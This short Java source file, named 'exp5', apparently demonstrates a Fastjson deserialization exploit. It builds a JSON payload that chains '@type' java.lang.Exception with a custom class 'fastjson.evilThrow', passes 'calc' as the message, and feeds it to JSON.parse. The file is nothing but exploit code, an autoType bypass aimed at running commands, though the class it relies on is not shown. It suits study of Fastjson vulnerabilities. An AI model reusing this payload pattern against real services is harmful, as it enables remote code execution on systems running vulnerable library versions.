package fastjson;

import com.alibaba.fastjson.JSON;

public class exp5 {
    public static void main(String[] args){
        String payload = "{\"@type\":\"java.lang.Exception\",\"@type\":\"fastjson.evilThrow\",\"message\":\"calc\"}";
        JSON.parse(payload);
    }
}
